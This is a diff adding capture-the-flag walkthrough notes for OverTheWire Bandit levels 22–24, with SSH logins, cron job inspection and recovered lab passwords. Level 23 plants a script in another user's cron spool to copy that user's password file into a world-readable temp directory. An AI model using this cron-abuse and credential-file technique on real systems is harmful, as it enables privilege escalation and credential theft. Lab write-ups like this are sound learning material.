@@ -154,10 +154,38 @@
     </p>
 <p><b>Bandit Level 21 → Level 22</b>
   <br>ssh bandit21@bandit.labs.overthewire.org -p 2220
-  <br>cron + tab -> will see "cronjob_bandit22.sh  cronjob_bandit23.sh  crontab"
+  <br>cron + tab
+  <br>#cronjob_bandit22.sh  cronjob_bandit23.sh  crontab
   <br>cronjob_bandit22.sh
   <br>#chmod: changing permissions of '/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv': Operation not permitted
   <br>#/usr/bin/cronjob_bandit22.sh: line 3: /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied
   <br>cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
   <br>Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+    </p>
+<p><b>Bandit Level 22 → Level 23</b>
+  <br>ssh bandit22@bandit.labs.overthewire.org -p 2220
+  <br>cd /etc/cron.d/
+  <br>cat cronjob_bandit23
+  <br>cat /usr/bin/cronjob_bandit23.sh
+  <br>echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+  <br>cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+  <br>jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+    </p>
+<p><b>Bandit Level 23 → Level 24</b>
+  <br>ssh bandit23@bandit.labs.overthewire.org -p 2220
+  <br>cd /etc/cron.d/
+  <br>cat cronjob_bandit24
+  <br>cat /usr/bin/cronjob_bandit24.sh
+  <br>mkdir /tmp/dir_name
+  <br>cd /tmp/dir_name
+  <br>vim script.sh
+  <br>#!/bin/sh
+  <br>cat /etc/bandit_pass/bandit24 > /tmp/dir_name/password
+  <br>chmod 777 script.sh
+  <br>chmod -R 777 /tmp/dir_name
+  <br>cp script.sh /var/spool/bandit24/
+  <br>ls
+  <br>#script.sh  password
+  <br>cat password
+  <br>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
     </p>
